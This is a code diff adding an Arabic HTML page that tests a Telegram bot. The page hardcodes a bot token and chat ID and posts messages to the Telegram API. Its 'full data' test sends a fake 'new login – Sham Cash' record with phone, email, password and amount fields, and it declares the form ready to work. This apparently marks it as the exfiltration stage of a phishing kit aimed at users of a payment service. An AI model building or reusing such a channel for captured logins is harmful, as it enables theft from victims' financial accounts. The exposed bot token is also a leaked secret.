@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اختبار بوت تيليجرام</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #0d1520;
+            color: white;
+            padding: 40px;
+            text-align: center;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(19, 25, 42, 0.6);
+            padding: 30px;
+            border-radius: 12px;
+            border: 1px solid rgba(42, 52, 80, 0.4);
+        }
+        h1 {
+            color: #5b7ba8;
+            margin-bottom: 30px;
+        }
+        button {
+            background: linear-gradient(135deg, #4a7ca8 0%, #5a8dc9 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 10px;
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(74, 124, 168, 0.6);
+        }
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        #result {
+            margin-top: 30px;
+            padding: 20px;
+            border-radius: 8px;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        .success {
+            background: rgba(46, 204, 113, 0.2);
+            border: 1px solid rgba(46, 204, 113, 0.4);
+            color: #2ecc71;
+        }
+        .error {
+            background: rgba(231, 76, 60, 0.2);
+            border: 1px solid rgba(231, 76, 60, 0.4);
+            color: #e74c3c;
+        }
+        .info {
+            background: rgba(52, 152, 219, 0.2);
+            border: 1px solid rgba(52, 152, 219, 0.4);
+            color: #3498db;
+        }
+        .code {
+            background: rgba(13, 21, 32, 0.8);
+            padding: 10px;
+            border-radius: 6px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            text-align: left;
+            direction: ltr;
+            overflow-x: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🤖 اختبار بوت تيليجرام</h1>
+        
+        <div class="info" style="margin-bottom: 20px;">
+            <strong>معلومات البوت:</strong><br>
+            <div class="code">
+Token: 8335962255:AAHDeJbWKC9D7zeESdlMtq5cX86PnFVKjuk<br>
+Chat ID: 7464148063<br>
+Bot: @sh3ams_bot
+            </div>
+        </div>
+
+        <button onclick="testBot()" id="testBtn">📤 إرسال رسالة اختبار</button>
+        <button onclick="testWithData()" id="testDataBtn">📋 اختبار بيانات كاملة</button>
+        
+        <div id="result"></div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8335962255:AAHDeJbWKC9D7zeESdlMtq5cX86PnFVKjuk';
+        const TELEGRAM_CHAT_ID = '7464148063';
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const result = await response.json();
+                return result;
+            } catch (error) {
+                return { ok: false, error: error.message };
+            }
+        }
+
+        async function testBot() {
+            const btn = document.getElementById('testBtn');
+            const resultDiv = document.getElementById('result');
+            
+            btn.disabled = true;
+            btn.textContent = '⏳ جاري الإرسال...';
+            resultDiv.innerHTML = '<div class="info">⏳ جاري إرسال رسالة الاختبار...</div>';
+
+            const testMessage = `
+🧪 <b>رسالة اختبار</b>
+
+✅ البوت يعمل بنجاح!
+⏰ الوقت: ${new Date().toLocaleString('ar-SY')}
+
+هذه رسالة اختبار من موقع شام كاش.
+            `.trim();
+
+            const result = await sendToTelegram(testMessage);
+
+            btn.disabled = false;
+            btn.textContent = '📤 إرسال رسالة اختبار';
+
+            if (result.ok) {
+                resultDiv.innerHTML = `
+                    <div class="success">
+                        <strong>✅ نجح الإرسال!</strong><br><br>
+                        تم إرسال الرسالة إلى تيليجرام بنجاح.<br>
+                        تحقق من محادثتك مع <a href="https://t.me/sh3ams_bot" target="_blank" style="color: #2ecc71;">@sh3ams_bot</a><br><br>
+                        <div class="code" style="background: rgba(13, 21, 32, 0.6);">
+Message ID: ${result.result.message_id}<br>
+Date: ${new Date(result.result.date * 1000).toLocaleString('ar-SY')}
+                        </div>
+                    </div>
+                `;
+            } else {
+                resultDiv.innerHTML = `
+                    <div class="error">
+                        <strong>❌ فشل الإرسال</strong><br><br>
+                        ${result.description || result.error || 'خطأ غير معروف'}<br><br>
+                        <strong>نصائح:</strong><br>
+                        • تأكد من أنك بدأت محادثة مع البوت (/start)<br>
+                        • تحقق من صحة Chat ID<br>
+                        • تحقق من Token البوت<br><br>
+                        <div class="code" style="background: rgba(13, 21, 32, 0.6);">
+${JSON.stringify(result, null, 2)}
+                        </div>
+                    </div>
+                `;
+            }
+        }
+
+        async function testWithData() {
+            const btn = document.getElementById('testDataBtn');
+            const resultDiv = document.getElementById('result');
+            
+            btn.disabled = true;
+            btn.textContent = '⏳ جاري الإرسال...';
+            resultDiv.innerHTML = '<div class="info">⏳ جاري إرسال بيانات الاختبار...</div>';
+
+            const testMessage = `
+🔔 <b>تسجيل دخول جديد - شام كاش</b>
+
+📱 <b>رقم الهاتف:</b> 0912345678
+📧 <b>البريد الإلكتروني:</b> test@example.com
+🔐 <b>كلمة السر:</b> ********
+💰 <b>المبلغ المتفق عليه:</b> 1000 ليرة
+
+⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-SY')}
+
+<i>هذه بيانات اختبار</i>
+            `.trim();
+
+            const result = await sendToTelegram(testMessage);
+
+            btn.disabled = false;
+            btn.textContent = '📋 اختبار بيانات كاملة';
+
+            if (result.ok) {
+                resultDiv.innerHTML = `
+                    <div class="success">
+                        <strong>✅ نجح الإرسال!</strong><br><br>
+                        تم إرسال البيانات الاختبارية بنجاح!<br>
+                        النموذج جاهز للعمل 🎉<br><br>
+                        تحقق من تيليجرام: <a href="https://t.me/sh3ams_bot" target="_blank" style="color: #2ecc71;">@sh3ams_bot</a>
+                    </div>
+                `;
+            } else {
+                resultDiv.innerHTML = `
+                    <div class="error">
+                        <strong>❌ فشل الإرسال</strong><br><br>
+                        ${result.description || result.error || 'خطأ غير معروف'}<br><br>
+                        <div class="code" style="background: rgba(13, 21, 32, 0.6);">
+${JSON.stringify(result, null, 2)}
+                        </div>
+                    </div>
+                `;
+            }
+        }
+
+        // Auto test on load
+        window.addEventListener('load', function() {
+            document.getElementById('result').innerHTML = `
+                <div class="info">
+                    <strong>📋 جاهز للاختبار!</strong><br><br>
+                    اضغط على أحد الأزرار أعلاه لاختبار البوت.<br><br>
+                    <small>تأكد من أنك بدأت محادثة مع @sh3ams_bot قبل الاختبار</small>
+                </div>
+            `;
+        });
+    </script>
+</body>
+</html>
